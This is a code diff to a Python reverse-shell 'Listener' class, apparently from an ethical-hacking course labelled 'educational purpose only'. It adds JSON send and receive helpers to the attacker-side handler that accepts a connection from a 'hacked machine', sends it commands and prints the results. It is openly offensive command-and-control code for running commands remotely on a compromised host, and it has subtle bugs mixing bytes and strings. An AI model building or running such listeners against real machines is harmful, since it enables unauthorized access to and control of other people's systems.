@@ -7,6 +7,7 @@ Please use for educational purpose only...
 """
 
 import socket
+import json
 
 
 class Listener:
@@ -20,9 +21,22 @@ class Listener:
         self.connection, address = listener.accept()
         print("[+] Got a connection from " + str(address))
 
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data)
+
+    def reliable_receive(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + self.connection.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
     def execute_remote_command(self, command):
-        self.connection.send(command)
-        return self.connection.recv(1024)
+        self.reliable_send(command)
+        return self.reliable_receive()
 
     def run(self):
         while True:
@@ -31,6 +45,6 @@ class Listener:
             print(result)
 
 
-# Replace ip with the ip of the hacked machine
-my_listener = Listener("192.168.1.23", 4444)
+# Replace ip and port of your choice
+my_listener = Listener("192.168.1.24", 4444)
 my_listener.run()
